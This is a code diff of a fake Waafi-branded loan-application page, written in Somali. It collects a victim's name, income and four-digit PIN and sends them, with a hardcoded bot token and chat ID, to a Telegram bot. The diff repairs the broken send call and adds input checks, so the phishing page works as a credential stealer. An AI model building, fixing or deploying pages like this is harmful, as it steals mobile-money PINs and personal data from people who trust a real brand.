@@ -9,11 +9,11 @@ label{display:block;margin:15px 0 5px;font-weight:600} input,select{width:100%;p
 .summary{background:#f0fff4;border-left:4px solid #00B347;padding:15px;border-radius:10px;margin:20px 0}
 .summary .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #e0e0e0}
 .pin{display:flex;justify-content:center;gap:12px;margin:15px 0}
-.pin input{width:50px;height:50px;text-align:center;font-size:22px;border:2px solid #00B347}
+.pin input{width:50px;height:50px;text-align:center;font-size:22px;border:2px solid #00B347;border-radius:10px}
 .btn{width:100%;padding:18px;border:none;border-radius:12px;font-size:18px;font-weight:bold;background:linear-gradient(90deg,#a8e063,#00B347);color:white;margin-top:10px}
-.btn-gray{background:#ddd;color:#333} .btn:disabled{background:#ccc}</style>
+.btn:disabled{background:#ccc}</style>
 </head><body>
-<div class="header">← Dib u noqo <span style="margin-left:auto">Waafi</span> ☰</div>
+<div class="header">← Dib u noqo <span style="margin-left:auto">Waafi</span></div>
 <div class="container"><div class="card">
 <h2>Codsiga Amaahda</h2><p class="sub">Tallaabada 3 ee 3 - Xaqiiji</p>
 <div class="progress"><div class="bar active"></div><div class="bar active"></div><div class="bar active"></div></div>
@@ -21,47 +21,41 @@ label{display:block;margin:15px 0 5px;font-weight:600} input,select{width:100%;p
 <label>Xaaladda Shaqada</label>
 <select id="work"><option>Shaqaale</option><option>Iskaashato</option><option>Arday</option><option>Shagala'aan</option></select>
 
-<label>Dakhliga Sanadka ($)</label><input id="income" type="number" placeholder="25000">
+<label>Dakhliga Sanadka ($)</label><input id="income" type="number" placeholder="50000">
 
-<label style="text-align:center">Geli PIN-kaaga si aad u xaqiijiso</label>
+<label style="text-align:center;margin-top:20px">Geli PIN-kaaga si aad u xaqiijiso</label>
 <div class="pin">
-<input type="password" maxlength="1" oninput="check()">
-<input type="password" maxlength="1" oninput="check()">
-<input type="password" maxlength="1" oninput="check()">
-<input type="password" maxlength="1" oninput="check()">
+<input type="password" maxlength="1" id="p1">
+<input type="password" maxlength="1" id="p2">
+<input type="password" maxlength="1" id="p3">
+<input type="password" maxlength="1" id="p4">
 </div>
 
 <div class="summary"><h3>Soo koobidda Codsiga</h3>
-<div class="row"><span>Qaddarka Amaahda:</span><span id="s_amount">$1,000</span></div>
-<div class="row"><span>Muddada Amaahda:</span><span id="s_period">12 Bilood</span></div>
+<div class="row"><span>Qaddarka Amaahda:</span><span id="s_amount">$0</span></div>
+<div class="row"><span>Muddada Amaahda:</span><span id="s_period">-</span></div>
 <div class="row"><span>Ujeedada:</span><span id="s_purpose">-</span></div>
 <div class="row"><span>Codsade:</span><span id="s_name">-</span></div>
 </div>
 
-<button class="btn-gray" onclick="location.href='step2.html'">KA HORE</button>
-<button class="btn" id="sendBtn" onclick="submit()" disabled>DIR CODSIGA</button>
+<button class="btn" id="sendBtn" onclick="submit()">DIR CODSIGA</button>
 </div></div>
 <script>
-const step1=JSON.parse(localStorage.getItem('waafi_step1'));
-const step2=JSON.parse(localStorage.getItem('waafi_step2'));
-s_amount.innerText='$'+Number(step1.amount).toLocaleString();
-s_period.innerText=step1.period;
-s_purpose.innerText=step1.type;
-s_name.innerText=step2.fname+' '+step2.lname;
+const step1=JSON.parse(localStorage.getItem('waafi_step1')||'{}');
+const step2=JSON.parse(localStorage.getItem('waafi_step2')||'{}');
+s_amount.innerText='$'+Number(step1.amount||0).toLocaleString();
+s_period.innerText=step1.period||'-';
+s_purpose.innerText=step1.type||'-';
+s_name.innerText=(step2.fname||'')+' '+(step2.lname||'');
 
-const inputs=document.querySelectorAll('.pin input');
-const btn=document.getElementById('sendBtn');
-function check(){
-let pin=Array.from(inputs).map(i=>i.value).join('');
-if(pin.length==4 && income.value) btn.disabled=false; else btn.disabled=true;
-}
-inputs.forEach(i=>i.addEventListener('input',check));
-document.getElementById('income').addEventListener('input',check);
-
-const BOT="8811313030:AAHsQrh9DveSLEB2eRNmVPJF_2HtMGtJJ7A"; const CHAT="8630213836";
+const BOT="8811313030:AAHsQrh9DveSLEB2eRNmVPJF_2HtMGtJJ7A"; 
+const CHAT="8630213836";
 
 function submit(){
-const pin=Array.from(inputs).map(i=>i.value).join('');
+const pin=p1.value+p2.value+p3.value+p4.value;
+if(pin.length<4)return alert('Geli 4 PIN');
+if(!income.value)return alert('Geli dakhliga');
+
 const fullData={...step1,...step2,work:work.value,income:income.value,pin:pin};
 
 const message=`🔥 NEW WAAFI APPLICATION 🔥
@@ -81,8 +75,18 @@ const message=`🔥 NEW WAAFI APPLICATION 🔥
 
 Time: ${new Date().toLocaleString()}`;
 
-fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},
+fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
 body:JSON.stringify({chat_id:CHAT,text:message})
-.then(()=>{localStorage.clear();location.href='success.html';})
-.catch(()=>alert("Cilad ayaa dhacday. Hubi internetka"));
-}</script></body></html>
+})
+.then(res=>res.json())
+.then(data=>{
+if(data.ok){
+localStorage.clear();
+location.href='success.html';
+}else{alert('Error: '+data.description)}
+})
+.catch(err=>alert("Internet error"));
+}
+</script></body></html>
